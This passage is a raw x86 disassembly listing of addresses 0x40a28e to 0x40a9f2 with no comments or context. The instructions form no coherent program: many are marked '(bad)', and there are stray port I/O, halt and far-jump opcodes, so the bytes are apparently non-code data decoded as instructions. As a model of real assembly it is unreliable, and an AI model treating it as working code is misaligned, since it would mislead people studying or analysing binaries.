  40a28e:	adc    al,0xde
  40a290:	and    eax,0xd20dd653
  40a295:	jmp    0x40a2fb
  40a297:	into   
  40a298:	ficom  WORD PTR [edx-0x40]
  40a29b:	rep outs dx,BYTE PTR ds:[esi]
  40a29d:	(bad)  
  40a29e:	leave  
  40a29f:	add    dh,BYTE PTR [edi+0x79]
  40a2a2:	xor    DWORD PTR [ebp+ecx*2-0x31ae6290],esp
  40a2a9:	addr16 sbb ch,dl
  40a2ac:	adc    ch,BYTE PTR [ebp-0x63d5adf3]
  40a2b2:	ins    DWORD PTR es:[edi],dx
  40a2b3:	ins    DWORD PTR es:[edi],dx
  40a2b4:	push   0xffffff80
  40a2b6:	adc    ah,BYTE PTR [edi+esi*2]
  40a2b9:	sub    esp,DWORD PTR ds:[ebx+0x4d]
  40a2bd:	sar    BYTE PTR [edi],1
  40a2bf:	inc    edx
  40a2c0:	mov    ds:0x40d8e7b6,al
  40a2c5:	mov    DWORD PTR [eax+edx*4-0x4e],esp
  40a2c9:	or     BYTE PTR [ebx+0x48],dh
  40a2cc:	hlt    
  40a2cd:	outs   dx,BYTE PTR ds:[esi]
  40a2ce:	push   ebp
  40a2cf:	adc    DWORD PTR [esi-0x1b70f6a0],ebp
  40a2d5:	mov    edi,0x49926f0c
  40a2da:	adc    dl,cl
  40a2dc:	imul   BYTE PTR ds:0xbc788844
  40a2e2:	shl    DWORD PTR [ebp-0x6d],cl
  40a2e5:	add    dl,BYTE PTR [edx+0x77]
  40a2e8:	push   ss
  40a2e9:	cmp    eax,DWORD PTR [ebp+eax*4+0x709a8ac2]
  40a2f0:	fxch   st(0)
  40a2f2:	mov    sp,es
  40a2f5:	scas   al,BYTE PTR es:[edi]
  40a2f6:	mov    ebp,0x125544c9
  40a2fb:	aaa    
  40a2fc:	icebp  
  40a2fd:	imul   ecx,DWORD PTR [ebx+edx*2-0x47],0x76f7d45f
  40a305:	daa    
  40a306:	xchg   edi,eax
  40a307:	pop    edx
  40a308:	out    dx,al
  40a309:	xchg   BYTE PTR [edi-0x105c44c7],dh
  40a30f:	nop
  40a310:	add    DWORD PTR [ebx-0x10],0xffffff9a
  40a314:	lock shr ah,1
  40a317:	push   ecx
  40a318:	or     al,0x7e
  40a31a:	pop    esi
  40a31b:	icebp  
  40a31c:	out    0xc8,eax
  40a31e:	jb     0x40a302
  40a320:	fwait
  40a321:	ins    BYTE PTR es:[edi],dx
  40a322:	mov    ebx,0xe7f4c0f4
  40a327:	push   esp
  40a328:	push   cs
  40a329:	out    dx,eax
  40a32a:	or     eax,edx
  40a32c:	add    al,0xcf
  40a32e:	retf   0xb113
  40a331:	push   es
  40a332:	inc    ebx
  40a333:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a334:	pop    ebp
  40a335:	adc    DWORD PTR ds:0x5cf60b41,eax
  40a33b:	and    DWORD PTR [esi-0xe],0x74
  40a33f:	and    DWORD PTR [ebp-0xe],0x74237f68
  40a346:	sub    al,0x3b
  40a348:	stc    
  40a349:	or     edx,DWORD PTR [eax+0x73cf228a]
  40a34f:	lods   al,BYTE PTR ds:[esi]
  40a350:	mov    ds:0xff598d96,eax
  40a355:	or     ch,dl
  40a357:	or     BYTE PTR [edi+0x670475ce],dl
  40a35d:	in     eax,0x56
  40a35f:	or     esp,DWORD PTR [esi]
  40a361:	mov    bh,0xcc
  40a363:	fcmovnbe st,st(4)
  40a365:	xor    BYTE PTR [ebp-0x49c1d798],bh
  40a36b:	imul   eax,DWORD PTR [ebx+0x4c8c0bc],0xffffff88
  40a372:	dec    ecx
  40a373:	push   edx
  40a374:	mov    ah,0xc0
  40a376:	loopne 0x40a312
  40a378:	call   DWORD PTR [esi]
  40a37a:	jb     0x40a3df
  40a37c:	xor    BYTE PTR [ebp-0x46],0x18
  40a380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a381:	dec    esp
  40a382:	(bad)  
  40a383:	rol    ebp,cl
  40a385:	ror    DWORD PTR [ebx-0x28],cl
  40a388:	gs pop esp
  40a38a:	scas   eax,DWORD PTR es:[edi]
  40a38b:	xor    dl,BYTE PTR [edx]
  40a38d:	arpl   WORD PTR [edi],dx
  40a38f:	stos   DWORD PTR es:[edi],eax
  40a390:	rol    BYTE PTR [eax],0x8e
  40a393:	or     edx,edx
  40a395:	dec    edx
  40a396:	(bad)  
  40a397:	jmp    0x8ba4:0xecba492
  40a39e:	enter  0x23c4,0x2d
  40a3a2:	std    
  40a3a3:	cld    
  40a3a4:	jmp    0x6376dbe
  40a3a9:	xor    BYTE PTR [ebp-0x19],0xd1
  40a3ad:	xor    bh,bh
  40a3af:	fild   WORD PTR cs:0x1661bd54
  40a3b6:	into   
  40a3b7:	test   al,0xf1
  40a3b9:	loop   0x40a3d7
  40a3bb:	test   eax,0xcefab852
  40a3c0:	fadd   st(0),st
  40a3c2:	out    dx,eax
  40a3c3:	lods   eax,DWORD PTR ds:[esi]
  40a3c4:	mov    ss,WORD PTR [ebx]
  40a3c6:	mov    dl,0x50
  40a3c8:	xchg   ebp,eax
  40a3c9:	ss clc 
  40a3cb:	pop    es
  40a3cc:	test   eax,0x243af98
  40a3d1:	cmp    al,ch
  40a3d3:	cmp    DWORD PTR ds:0xc17d3e6c,0xfffffff7
  40a3da:	in     al,dx
  40a3db:	pop    ss
  40a3dc:	push   esi
  40a3dd:	push   esp
  40a3de:	sub    ah,bh
  40a3e0:	mov    al,ds:0xcdc2e4e1
  40a3e5:	sub    DWORD PTR [edx],ecx
  40a3e7:	into   
  40a3e8:	jo     0x40a409
  40a3ea:	daa    
  40a3eb:	ja     0x40a3ef
  40a3ed:	ficomp DWORD PTR [eax+0x52]
  40a3f0:	adc    dh,BYTE PTR [ebx-0x40]
  40a3f3:	imul   DWORD PTR [edx-0x5a]
  40a3f6:	fadd   QWORD PTR [esi+edi*4+0x1e62e6ef]
  40a3fd:	lds    edx,FWORD PTR [edx-0xdff23f3]
  40a403:	mov    edx,0xcc5c43bf
  40a408:	test   al,0xba
  40a40a:	xor    eax,0xbfae0d9a
  40a40f:	stos   BYTE PTR es:[edi],al
  40a410:	adc    ebx,ecx
  40a412:	call   0x6613:0x47d71e55
  40a419:	sar    BYTE PTR [eax+0x68],0x2e
  40a41d:	lds    ebp,FWORD PTR [ebp-0x727f038c]
  40a423:	enter  0xb628,0x59
  40a427:	mov    gs:0x7029401d,eax
  40a42d:	or     al,0xc0
  40a42f:	(bad)  
  40a430:	cmp    dl,BYTE PTR [ebp-0x7175bcc0]
  40a436:	lds    edx,FWORD PTR [ebp+0x4c956c49]
  40a43c:	and    al,0x59
  40a43e:	push   esi
  40a43f:	sbb    al,0x57
  40a441:	daa    
  40a442:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a443:	int    0x78
  40a445:	inc    esi
  40a446:	xchg   esp,eax
  40a447:	dec    esi
  40a448:	pop    eax
  40a449:	jmp    0x49b90af9
  40a44e:	pop    ebp
  40a44f:	mov    edi,0xa7318d1a
  40a454:	(bad)
  40a457:	imul   ecx,DWORD PTR [esi],0x15
  40a45a:	xor    al,0x74
  40a45c:	mov    dl,0x7b
  40a45e:	cmp    dl,BYTE PTR [eax+0x6394cff6]
  40a464:	idiv   DWORD PTR [eax]
  40a466:	pop    ds
  40a467:	rcr    esp,0x3d
  40a46a:	enter  0x3d12,0xc6
  40a46e:	shr    DWORD PTR [edx+0x7],0x7f
  40a472:	mov    ch,0x9c
  40a474:	inc    esp
  40a475:	cdq    
  40a476:	and    al,0x11
  40a478:	stos   DWORD PTR es:[edi],eax
  40a479:	fwait
  40a47a:	call   0xf235:0xaaab97ff
  40a481:	inc    edx
  40a482:	shl    DWORD PTR [esi+0x6a],1
  40a485:	cmc    
  40a486:	imul   ebp,DWORD PTR [edx+0x6d1ce4],0x6943e136
  40a490:	jg     0x40a45e
  40a492:	lods   al,BYTE PTR ds:[esi]
  40a493:	rcl    DWORD PTR [edx],0x4a
  40a496:	mov    cl,0xd7
  40a498:	pop    ds
  40a499:	in     eax,dx
  40a49a:	mov    ch,cl
  40a49c:	fnstenv [edi+0x76ceb82a]
  40a4a2:	mov    esp,0x98292054
  40a4a7:	in     eax,0xd5
  40a4a9:	jo     0x40a46a
  40a4ab:	inc    eax
  40a4ac:	fwait
  40a4ad:	mov    al,0x9a
  40a4af:	mov    ah,0x4b
  40a4b1:	ins    DWORD PTR es:[edi],dx
  40a4b2:	imul   edi,DWORD PTR [edx+0x7e],0xffffffa5
  40a4b6:	ins    BYTE PTR es:[edi],dx
  40a4b7:	ficomp WORD PTR [eax+0x72]
  40a4ba:	lahf   
  40a4bb:	data16 xor al,0xdd
  40a4be:	dec    edx
  40a4bf:	jo     0x40a468
  40a4c1:	mov    eax,ds:0xb99fae9c
  40a4c6:	cs adc al,0xc3
  40a4c9:	call   0x30ee6bb3
  40a4ce:	jmp    0xb81f619b
  40a4d3:	stos   DWORD PTR es:[edi],eax
  40a4d4:	hlt    
  40a4d5:	je     0x40a519
  40a4d7:	int3   
  40a4d8:	cmc    
  40a4d9:	dec    esp
  40a4da:	lock sub al,0x4c
  40a4dd:	jmp    0x4ca73f44
  40a4e2:	pop    eax
  40a4e3:	addr16 mov eax,?
  40a4e6:	(bad)  
  40a4e7:	fild   DWORD PTR [edi+0x6e]
  40a4ea:	pop    ecx
  40a4eb:	and    eax,0x16ce97db
  40a4f0:	pop    ecx
  40a4f1:	add    al,0xf7
  40a4f3:	jge    0x40a524
  40a4f5:	outs   dx,DWORD PTR ds:[esi]
  40a4f6:	mov    esi,DWORD PTR [esi+ebp*1]
  40a4f9:	mov    al,0xed
  40a4fb:	fs test al,0x18
  40a4fe:	and    eax,0x176972e1
  40a503:	cli    
  40a504:	push   ds
  40a505:	xchg   esi,eax
  40a506:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a507:	ss inc ebp
  40a509:	xchg   esi,eax
  40a50a:	je     0x40a52d
  40a50c:	cdq    
  40a50d:	mov    edi,0x93d36bfc
  40a512:	jns    0x40a4c6
  40a514:	ret    0x7901
  40a517:	adc    bl,BYTE PTR [edi]
  40a519:	(bad)  
  40a51a:	jns    0x40a567
  40a51c:	fs xchg ebp,eax
  40a51e:	adc    eax,ebx
  40a520:	arpl   WORD PTR [esi-0x1c722064],cx
  40a526:	jg     0x40a4f1
  40a528:	js     0x40a4f5
  40a52a:	fistp  QWORD PTR [esi]
  40a52c:	pop    ecx
  40a52d:	addr16 pop esp
  40a52f:	fild   DWORD PTR [edi+0x4c]
  40a532:	jle    0x40a4bb
  40a534:	sbb    ecx,0xffffffdf
  40a537:	inc    ecx
  40a538:	add    al,ch
  40a53a:	add    eax,0xa8c38621
  40a53f:	mov    cl,0xcd
  40a541:	jo     0x40a57b
  40a543:	mov    ss,WORD PTR [ebx]
  40a545:	mov    dl,0x90
  40a547:	pop    ebx
  40a548:	aas    
  40a549:	cmp    BYTE PTR [bx+si-0x6a],ah
  40a54d:	add    bh,BYTE PTR [ecx+0xf5db3a8]
  40a553:	pop    DWORD PTR [esi]
  40a555:	inc    ebp
  40a556:	push   ds
  40a557:	push   ebx
  40a558:	outs   dx,BYTE PTR ds:[esi]
  40a559:	mov    ebp,0xce9a9d58
  40a55e:	inc    esp
  40a55f:	clc    
  40a560:	xchg   BYTE PTR [ecx],ah
  40a562:	push   esi
  40a563:	pop    ebx
  40a564:	adc    dl,BYTE PTR [esi-0x51]
  40a567:	ins    DWORD PTR es:[edi],dx
  40a568:	and    BYTE PTR [eax],dh
  40a56a:	call   0x2132aada
  40a56f:	popa   
  40a570:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a571:	push   edi
  40a572:	stos   DWORD PTR es:[edi],eax
  40a573:	push   fs
  40a575:	pushf  
  40a576:	inc    esp
  40a577:	pop    esp
  40a578:	jmp    0x40a518
  40a57a:	fsub   QWORD PTR [edi+eiz*2+0x679fb13e]
  40a581:	push   es
  40a582:	shr    DWORD PTR [ebx],cl
  40a584:	(bad)  
  40a585:	xchg   ecx,eax
  40a586:	test   al,0xdb
  40a588:	push   esp
  40a589:	(bad)  
  40a58a:	xor    ebx,ebx
  40a58c:	adc    ebx,DWORD PTR [ebx+0x16121ec0]
  40a592:	or     edx,DWORD PTR [ebx+0x3cc13a4d]
  40a598:	test   BYTE PTR ds:0xf5e29ad4,bh
  40a59e:	clc    
  40a59f:	xchg   ecx,eax
  40a5a0:	mov    dl,0xd9
  40a5a2:	(bad)  
  40a5a3:	bound  ebp,QWORD PTR [esi]
  40a5a5:	rol    DWORD PTR [ebp+0x66],0x46
  40a5a9:	sar    ebp,cl
  40a5ab:	fwait
  40a5ac:	sbb    ecx,esp
  40a5ae:	xor    BYTE PTR [ecx],dh
  40a5b0:	inc    edi
  40a5b1:	jae    0x40a611
  40a5b3:	mov    ebx,0xff8dd74a
  40a5b8:	int    0x91
  40a5ba:	pop    eax
  40a5bb:	pop    es
  40a5bc:	cdq    
  40a5bd:	and    DWORD PTR [ebx+0x57],esp
  40a5c0:	inc    BYTE PTR [ebp-0x62]
  40a5c3:	mov    DWORD PTR [esi],esp
  40a5c5:	add    eax,0x1deb6cff
  40a5ca:	dec    esi
  40a5cb:	dec    ebp
  40a5cc:	adc    DWORD PTR [ebp-0x3d3edf57],ebp
  40a5d2:	data16 mov dl,0x87
  40a5d5:	jecxz  0x40a601
  40a5d7:	(bad)  
  40a5d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5d9:	jne    0x40a597
  40a5db:	jbe    0x40a58e
  40a5dd:	mov    ebp,0xb1ab5d24
  40a5e2:	sbb    esp,DWORD PTR [edx-0x50357fb8]
  40a5e8:	in     eax,0x37
  40a5ea:	lock add esp,esi
  40a5ed:	mov    al,ds:0x65a2087c
  40a5f2:	dec    eax
  40a5f3:	fs inc ecx
  40a5f5:	push   ecx
  40a5f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5f7:	inc    cx
  40a5f9:	cmp    BYTE PTR [eax+eax*1+0x4d],al
  40a5fd:	and    eax,0xf72b1cac
  40a602:	retf   0xd360
  40a605:	in     al,dx
  40a606:	mov    ecx,DWORD PTR [ebx+0x5f]
  40a609:	xchg   BYTE PTR [esi+0x1fb99006],al
  40a60f:	in     al,0x4e
  40a611:	dec    eax
  40a612:	push   ecx
  40a613:	mov    ds:0xa7808064,al
  40a618:	cmc    
  40a619:	pop    ebp
  40a61a:	or     eax,0x76119c93
  40a61f:	pushf  
  40a620:	dec    esp
  40a621:	daa    
  40a622:	enter  0x68f4,0xa6
  40a626:	mov    DWORD PTR [edi+0x22],ebx
  40a629:	mov    al,0x23
  40a62b:	inc    ecx
  40a62c:	dec    edx
  40a62d:	and    ecx,esi
  40a62f:	mov    BYTE PTR [eax-0x106ab9c9],dl
  40a635:	jl     0x40a6b5
  40a637:	jg     0x40a6a9
  40a639:	shr    al,0xbf
  40a63c:	dec    esp
  40a63d:	ds mov ebx,0xf9fdf9e2
  40a643:	loopne 0x40a61a
  40a645:	mov    ecx,0xd6c3e75a
  40a64a:	pop    eax
  40a64b:	xchg   ebx,eax
  40a64c:	fsubr  DWORD PTR [ecx+0x1e]
  40a64f:	aam    0x3d
  40a651:	xor    BYTE PTR [ebx],dl
  40a653:	jnp    0x40a5f6
  40a655:	out    0xb8,eax
  40a657:	jmp    0x40a5fd
  40a659:	in     eax,0x98
  40a65b:	cdq    
  40a65c:	sahf   
  40a65d:	sahf   
  40a65e:	sub    ebx,DWORD PTR [eax]
  40a660:	lea    esp,[eax]
  40a662:	mov    edx,0xcb07ff30
  40a667:	(bad)  
  40a668:	popa   
  40a669:	push   ds
  40a66a:	mov    edx,0xcc752d14
  40a66f:	jno    0x40a67f
  40a671:	std    
  40a672:	push   edi
  40a673:	jns    0x40a608
  40a675:	jnp    0x40a65e
  40a677:	or     bl,BYTE PTR [ebp-0x6b]
  40a67a:	nop
  40a67b:	and    ah,BYTE PTR [edx+0x25ea9347]
  40a681:	neg    dh
  40a683:	mov    edx,DWORD PTR [ecx-0x1c]
  40a686:	xlat   BYTE PTR ds:[ebx]
  40a687:	sahf   
  40a688:	lahf   
  40a689:	rcl    DWORD PTR ds:0xd6fb184b,0x38
  40a690:	scas   al,BYTE PTR es:[edi]
  40a691:	out    0x1,eax
  40a693:	(bad)  
  40a695:	loopne 0x40a654
  40a697:	enter  0xaa8f,0xeb
  40a69b:	inc    esi
  40a69c:	mov    ebx,0xf44817fa
  40a6a1:	gs jp  0x40a668
  40a6a4:	cmp    al,0x33
  40a6a6:	mov    WORD PTR [edx],?
  40a6a8:	adc    BYTE PTR [ebx-0x45f96826],dl
  40a6ae:	pusha  
  40a6af:	mov    ebx,0xd9d98914
  40a6b4:	mov    cl,cl
  40a6b6:	push   DWORD PTR [ebp+0x30]
  40a6b9:	iret   
  40a6ba:	push   edi
  40a6bb:	sub    eax,0xda6bbdce
  40a6c0:	adc    ah,BYTE PTR [edi+0x28cd62b]
  40a6c6:	push   ds
  40a6c7:	(bad)  
  40a6c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6c9:	mov    bl,0x40
  40a6cb:	repz inc edx
  40a6cd:	pusha  
  40a6ce:	jg     0x40a694
  40a6d0:	mov    dh,0xbd
  40a6d2:	ret    
  40a6d3:	push   ebp
  40a6d4:	pop    edi
  40a6d5:	lahf   
  40a6d6:	shr    dl,0x5e
  40a6d9:	jle    0x40a6c7
  40a6db:	inc    edx
  40a6dc:	push   eax
  40a6dd:	mov    al,0x3
  40a6df:	scas   eax,DWORD PTR es:[edi]
  40a6e0:	dec    edi
  40a6e1:	pop    ebp
  40a6e2:	aaa    
  40a6e3:	jecxz  0x40a708
  40a6e5:	lds    esi,FWORD PTR [esi]
  40a6e7:	sbb    ebx,DWORD PTR [eax-0x11]
  40a6ea:	cmp    BYTE PTR [esi-0x576eb3d8],ch
  40a6f0:	call   0x5bcb4d
  40a6f5:	xor    ebp,DWORD PTR [ebx]
  40a6f7:	pop    edi
  40a6f8:	pushf  
  40a6f9:	mov    ebp,DWORD PTR [edi]
  40a6fb:	sbb    al,0xd3
  40a6fd:	jns    0x40a6d0
  40a6ff:	inc    ebp
  40a700:	(bad)  
  40a701:	mov    ch,0xec
  40a703:	daa    
  40a704:	and    al,0xbe
  40a706:	sbb    ecx,ecx
  40a708:	push   eax
  40a709:	mov    esi,0x54f04b3d
  40a70e:	nop
  40a70f:	inc    esi
  40a710:	stc    
  40a711:	(bad)  
  40a712:	enter  0x1fb2,0x75
  40a716:	sbb    eax,0xf568f6cb
  40a71b:	in     eax,dx
  40a71c:	adc    edi,DWORD PTR [esp+ebx*2-0x4d]
  40a720:	mov    BYTE PTR [esi+0x60],dl
  40a723:	cmp    ah,bl
  40a725:	add    ebx,DWORD PTR [eax-0x59e9994f]
  40a72b:	stos   BYTE PTR es:[edi],al
  40a72c:	sar    BYTE PTR [ecx+0x43],cl
  40a72f:	and    DWORD PTR [eax-0x37c4d18b],edx
  40a735:	add    dh,BYTE PTR [edi+edx*2+0x59]
  40a739:	inc    edi
  40a73a:	call   0x772dd960
  40a73f:	test   DWORD PTR [eax+0x6d],edx
  40a742:	add    al,0x46
  40a744:	sbb    bh,bh
  40a746:	sbb    DWORD PTR [eax+eiz*2+0x7d37420a],esi
  40a74d:	mov    dh,0x96
  40a74f:	ja     0x40a741
  40a751:	mov    esp,0x8dd61a4
  40a756:	not    BYTE PTR [edx+0x6d]
  40a759:	jbe    0x40a7d7
  40a75b:	inc    esp
  40a75c:	repz or BYTE PTR [ebx],ch
  40a75f:	retf   0xcbe1
  40a762:	(bad)  
  40a764:	xlat   BYTE PTR ds:[ebx]
  40a765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a766:	sub    eax,0x7dd27fd5
  40a76b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a76c:	add    eax,0x42bc6ac
  40a771:	loope  0x40a7b0
  40a773:	mov    esp,0x6aa74f73
  40a778:	sahf   
  40a779:	jle    0x40a7cb
  40a77b:	mov    dh,0xd8
  40a77d:	(bad)  
  40a77e:	jno    0x40a7de
  40a780:	ficomp DWORD PTR fs:[edi-0x14]
  40a784:	stc    
  40a785:	xor    ebx,0xffffff8d
  40a788:	mov    cs,WORD PTR [ebp-0x66]
  40a78b:	cs xchg dl,cl
  40a78e:	sub    ch,BYTE PTR [ecx-0x6f]
  40a791:	test   BYTE PTR [edx],al
  40a793:	out    dx,al
  40a794:	iret   
  40a795:	cmp    eax,0x72c61b31
  40a79a:	mov    eax,ds:0x87ed279f
  40a79f:	jmp    0xaf2c84e5
  40a7a4:	push   ss
  40a7a5:	jl     0x40a797
  40a7a7:	scas   eax,DWORD PTR es:[edi]
  40a7a8:	jns    0x40a7b4
  40a7aa:	push   0xffffffd5
  40a7ac:	ds xchg ah,dh
  40a7af:	adc    ecx,ecx
  40a7b1:	mov    ebx,0x81a03a22
  40a7b6:	mov    esi,0xfe25c5f5
  40a7bb:	push   ss
  40a7bc:	dec    esi
  40a7bd:	or     BYTE PTR [edx+ebx*4-0x6d0f8749],al
  40a7c4:	sbb    eax,0x31e13683
  40a7c9:	sbb    DWORD PTR [edi+0x2c],ebp
  40a7cc:	jmp    FWORD PTR [eax]
  40a7ce:	inc    ebp
  40a7cf:	mov    ss,WORD PTR [esp+esi*8]
  40a7d2:	popa   
  40a7d3:	xchg   esi,eax
  40a7d4:	int3   
  40a7d5:	mov    ebx,0x56c7b8ac
  40a7da:	mov    edx,0xb861a8e0
  40a7df:	out    dx,eax
  40a7e0:	sbb    esi,DWORD PTR [edi+0x61]
  40a7e3:	and    al,0xa4
  40a7e5:	mov    ah,0x75
  40a7e7:	pop    edx
  40a7e8:	push   esp
  40a7e9:	sbb    ch,BYTE PTR [ebx+0x35]
  40a7ec:	push   es
  40a7ed:	sub    BYTE PTR [ecx],0x63
  40a7f0:	mov    ds:0x7daae217,eax
  40a7f5:	ret    0x1ecd
  40a7f8:	out    dx,al
  40a7f9:	sub    BYTE PTR ds:0x3e06b852,bl
  40a7ff:	cmp    BYTE PTR [ecx],cl
  40a801:	fnsave [edx-0x12]
  40a804:	mov    ebx,0x4db89c66
  40a809:	jno    0x40a87a
  40a80b:	adc    esi,DWORD PTR [edi+0x5e]
  40a80e:	in     eax,dx
  40a80f:	mov    al,0x8e
  40a811:	out    0x7c,eax
  40a813:	mov    esi,0x1b61d5ec
  40a818:	add    DWORD PTR [eax],ecx
  40a81a:	dec    edi
  40a81b:	icebp  
  40a81c:	xchg   BYTE PTR [esi-0x5d],dl
  40a81f:	in     al,dx
  40a820:	pusha  
  40a821:	out    dx,eax
  40a822:	in     eax,dx
  40a823:	jge    0x40a869
  40a825:	clc    
  40a826:	mov    ds:0xcafc5435,eax
  40a82b:	lahf   
  40a82c:	mov    ds:0xf705a8d,al
  40a831:	into   
  40a832:	sub    al,0xa6
  40a834:	mov    cl,0xe1
  40a836:	cld    
  40a837:	jmp    0xf6db:0x6d512abd
  40a83e:	jge    0x40a85f
  40a840:	push   0xffffff87
  40a842:	xor    al,0xa8
  40a844:	adc    BYTE PTR [ebx-0x78],cl
  40a847:	clc    
  40a848:	sbb    eax,DWORD PTR [ebx]
  40a84a:	and    al,0xd
  40a84c:	js     0x40a7d9
  40a84e:	out    dx,al
  40a84f:	mov    eax,0x42f2a5aa
  40a854:	in     eax,dx
  40a855:	push   esp
  40a856:	sub    DWORD PTR [esi-0x7abff90],esi
  40a85c:	fist   WORD PTR [ecx]
  40a85e:	and    eax,0xcaf46702
  40a863:	aas    
  40a864:	ja     0x40a834
  40a866:	dec    ebx
  40a867:	ret    
  40a868:	inc    edx
  40a869:	push   edi
  40a86a:	jo     0x40a860
  40a86c:	xchg   edi,eax
  40a86d:	or     DWORD PTR [ebp+0x6c],0x5c5469ab
  40a874:	push   ds
  40a875:	stc    
  40a876:	call   0x85af765b
  40a87b:	dec    edx
  40a87c:	mov    cl,ah
  40a87e:	inc    esp
  40a87f:	sub    edi,ecx
  40a881:	mov    esp,0x512cd415
  40a886:	loop   0x40a839
  40a888:	cmp    DWORD PTR [ecx],edi
  40a88a:	imul   al
  40a88c:	sti    
  40a88d:	mov    ah,0xee
  40a88f:	nop
  40a890:	fcom   DWORD PTR gs:[edi+0x20]
  40a894:	mov    bl,0xaa
  40a896:	ret    
  40a897:	pop    ds
  40a898:	adc    eax,0x9d421c01
  40a89d:	and    al,0xb2
  40a89f:	loopne 0x40a832
  40a8a1:	xchg   ebx,eax
  40a8a2:	mov    ds:0x1d05debc,al
  40a8a7:	sbb    DWORD PTR [esi+esi*8+0x6f5934ff],ebp
  40a8ae:	pushf  
  40a8af:	(bad)  
  40a8b0:	or     DWORD PTR [ecx],eax
  40a8b2:	xor    dh,dl
  40a8b4:	push   ebx
  40a8b5:	push   eax
  40a8b6:	mov    cl,BYTE PTR [ecx]
  40a8b8:	int3   
  40a8b9:	fldlg2 
  40a8bb:	sub    eax,0x5249225b
  40a8c0:	fstp   TBYTE PTR [esp+ebx*8+0x5d]
  40a8c4:	aam    0xc0
  40a8c6:	ins    DWORD PTR es:[edi],dx
  40a8c7:	sbb    ch,BYTE PTR [ecx-0x5f]
  40a8ca:	fisubr DWORD PTR cs:[esi-0x4059f0e7]
  40a8d1:	mov    al,ds:0x745c3d92
  40a8d6:	loope  0x40a8fa
  40a8d8:	mov    eax,ds:0x4bd78ff3
  40a8dd:	out    0x6c,al
  40a8df:	je     0x40a8b6
  40a8e1:	mov    ss,WORD PTR [esi-0x72]
  40a8e4:	dec    edi
  40a8e5:	and    esi,DWORD PTR [ecx-0x15]
  40a8e8:	ins    BYTE PTR es:[edi],dx
  40a8e9:	ret    0x7f78
  40a8ec:	jb     0x40a935
  40a8ee:	mov    al,ds:0xff5fd774
  40a8f3:	pop    eax
  40a8f4:	push   ss
  40a8f5:	sahf   
  40a8f6:	outs   dx,DWORD PTR ds:[esi]
  40a8f7:	ret    0xc7b7
  40a8fa:	push   ds
  40a8fb:	mov    eax,0xb68528d
  40a900:	or     DWORD PTR [ebp-0x6f],esi
  40a903:	mov    bl,0x67
  40a905:	js     0x40a8d6
  40a907:	cmp    al,0x8e
  40a909:	adc    esp,ebx
  40a90b:	xchg   DWORD PTR [esi-0x65],esp
  40a90e:	jmp    0x54b1:0xc78736ee
  40a915:	repz in eax,0x9f
  40a918:	mov    eax,ds:0xf40712d8
  40a91d:	mov    al,ds:0x24bd20df
  40a922:	dec    ebx
  40a923:	ins    BYTE PTR es:[edi],dx
  40a924:	and    DWORD PTR [esi+edx*8-0x6138104a],esp
  40a92b:	mov    ecx,0x24ac16
  40a930:	dec    edx
  40a931:	xchg   bl,cl
  40a933:	cmp    al,0x85
  40a935:	iret   
  40a936:	sti    
  40a937:	(bad)  
  40a938:	jae    0x40a976
  40a93a:	icebp  
  40a93b:	inc    ecx
  40a93c:	aas    
  40a93d:	(bad)  
  40a93e:	xchg   edx,eax
  40a93f:	jmp    0x4b0f9fd1
  40a944:	xor    al,0x29
  40a946:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a947:	outs   dx,BYTE PTR ds:[esi]
  40a948:	mov    ah,0x71
  40a94a:	sub    esi,ebx
  40a94c:	jl     0x40a97f
  40a94e:	cmp    eax,0xb9d7962b
  40a953:	inc    edx
  40a954:	std    
  40a955:	or     eax,0xa2613ec3
  40a95a:	mov    ch,0x4a
  40a95c:	mov    al,0x30
  40a95e:	iret   
  40a95f:	in     eax,dx
  40a960:	cdq    
  40a961:	push   es
  40a962:	(bad)  
  40a963:	stos   BYTE PTR es:[edi],al
  40a964:	lahf   
  40a965:	popf   
  40a966:	cwde   
  40a967:	bound  ebx,QWORD PTR [ebp+0x22]
  40a96a:	aam    0x4d
  40a96c:	add    ecx,edx
  40a96e:	fucomp st(3)
  40a970:	sahf   
  40a971:	bound  ebx,QWORD PTR [edi]
  40a973:	mov    al,0xa0
  40a975:	test   DWORD PTR [esi-0x3d],0xfa63cb11
  40a97c:	xchg   esp,eax
  40a97d:	in     al,0x28
  40a97f:	out    0xa7,al
  40a981:	and    eax,0xdbdc447f
  40a986:	das    
  40a987:	push   ds
  40a988:	iret   
  40a989:	popa   
  40a98a:	mov    ch,0x28
  40a98c:	mov    cl,0x97
  40a98e:	mov    dl,0x2
  40a990:	jp     0x40a986
  40a992:	or     eax,0xb3d507f9
  40a997:	(bad)  
  40a998:	retf   0x8d66
  40a99b:	cmp    ah,BYTE PTR [ebx+0xb335633]
  40a9a1:	out    dx,eax
  40a9a2:	dec    esp
  40a9a3:	call   0xca63:0x49edd473
  40a9aa:	fld    QWORD PTR [eax+0x16]
  40a9ad:	xchg   BYTE PTR [edx],bh
  40a9af:	fdivr  DWORD PTR [ebp+0x691316ca]
  40a9b5:	sbb    BYTE PTR [ebp+0x3014911c],bh
  40a9bb:	pavgw  mm5,mm1
  40a9be:	rcr    DWORD PTR [ebx],1
  40a9c0:	sub    BYTE PTR [ebx-0x32],ch
  40a9c3:	push   0xf2c8484c
  40a9c8:	xor    al,0x91
  40a9ca:	hlt    
  40a9cb:	sub    ebx,DWORD PTR [ebp+0x2d]
  40a9ce:	mov    cl,0x4a
  40a9d0:	push   0x875b2420
  40a9d5:	sub    bh,BYTE PTR [eax]
  40a9d7:	lods   eax,DWORD PTR ds:[esi]
  40a9d8:	sbb    al,0xd7
  40a9da:	jle    0x40a972
  40a9dc:	mov    al,ds:0x2a1d7766
  40a9e1:	cmp    ah,BYTE PTR [ebx-0x1c6200df]
  40a9e7:	imul   esp,DWORD PTR [esi],0x90f48bb6
  40a9ed:	push   ds
  40a9ee:	pcmpeqw mm5,QWORD PTR [edi-0x1]
  40a9f2:	rcl    BYTE PTR ds:0xa676974d,1
